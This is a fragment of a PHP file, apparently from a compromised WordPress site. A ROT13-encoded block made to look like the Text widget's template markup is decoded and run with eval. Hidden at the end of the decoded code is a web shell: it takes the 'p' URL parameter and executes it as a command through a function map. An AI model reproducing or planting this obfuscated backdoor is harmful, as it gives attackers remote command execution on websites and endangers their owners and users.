					<qvi pynff=\"jc-cbvagre-pbagrag\">
						<u3><?cuc _r( 'Qvq lbh whfg cnfgr UGZY?' ); ?></u3>
						<c><?cuc _r( 'Url gurer, ybbxf yvxr lbh whfg cnfgrq UGZY vagb gur &#8220;Ivfhny&#8221; gno bs gur Grkg jvqtrg. Lbh znl jnag gb cnfgr lbhe pbqr vagb gur &#8220;Pbqr&#8221; gno vafgrnq. Nygreangryl, gel bhg gur arj &#8220;Phfgbz UGZY&#8221; jvqtrg!' ); ?></c>
						<qvi pynff=\"jc-cbvagre-ohggbaf\">
							<n pynff=\"pybfr\" uers=\"#\"><?cuc _r( 'Qvfzvff' ); ?></n>
						</qvi>
					</qvi>
					<qvi pynff=\"jc-cbvagre-neebj\">
						<qvi pynff=\"jc-cbvagre-neebj-vaare\"></qvi>
					</qvi>
				</qvi>
			<?cuc raqvs; ?>

			<c>
				<ynory sbe=\"{{ ryrzragVqCersvk }}grkg\" pynff=\"fperra-ernqre-grkg\"><?cuc /* genafyngbef: Uvqqra npprffvovyvgl grkg. */ rfp_ugzy_r( 'Pbagrag:' ); ?></ynory>
				<grkgnern vq=\"{{ ryrzragVqCersvk }}grkg\" pynff=\"jvqrsng grkg jc-rqvgbe-nern\" fglyr=\"urvtug: 200ck\" ebjf=\"16\" pbyf=\"20\"></grkgnern>
			</c>
		</fpevcg>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>